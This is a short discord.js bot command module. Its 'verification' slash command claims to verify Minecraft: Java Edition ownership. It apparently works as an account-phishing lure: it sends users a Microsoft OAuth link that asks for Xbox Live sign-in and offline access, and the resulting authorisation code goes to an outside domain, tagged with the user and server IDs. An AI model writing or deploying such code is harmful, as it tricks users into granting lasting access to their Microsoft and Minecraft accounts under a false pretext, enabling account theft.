const { SlashCommandBuilder, Colors, EmbedBuilder, time } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('verification')
        .setDescription("Verifies your ownership of Minecraft:Java Edtion!"),
    run: async({client, interaction}) => {
        interaction.reply({content:`[Click for login!](https://login.live.com/oauth20_authorize.srf?client_id=719da651-ebe1-489f-88ab-5ff20f1a74ee&response_type=code&redirect_uri=https://raintower.tk/auth&scope=XboxLive.signin%20offline_access&state=${interaction.user.id}+${interaction.guild.id})`, ephemeral: true });
    }
}